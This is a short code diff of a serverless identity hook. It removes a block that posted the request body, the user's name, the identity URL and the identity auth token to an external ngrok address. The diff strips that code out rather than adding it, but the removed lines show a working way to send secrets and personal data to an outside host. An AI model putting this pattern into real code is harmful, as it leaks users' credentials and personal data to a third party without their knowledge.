@@ -10,22 +10,6 @@ exports.handler = async (event, context) => {
 
 	const statusCode = data.users.length > 0 ? 403 : 200;
 	
-	let returnValue = {
-		body: event.body,
-		parsed: JSON.parse(event.body).user.user_metadata.full_name,
-		data: data,
-		identityUrl: identity.url,
-		token: identity.token,
-		statusCode: statusCode
-	};
-	
-	await fetch('https://61f5-82-4-207-90.ngrok.io', {
-		method: 'POST',
-		body: JSON.stringify(returnValue),
-		headers: { Authorization: 'Bearer ' + identity.token },
-	}).then(res => res.json())
-	
-	
 	return {
 		statusCode: statusCode
 	};
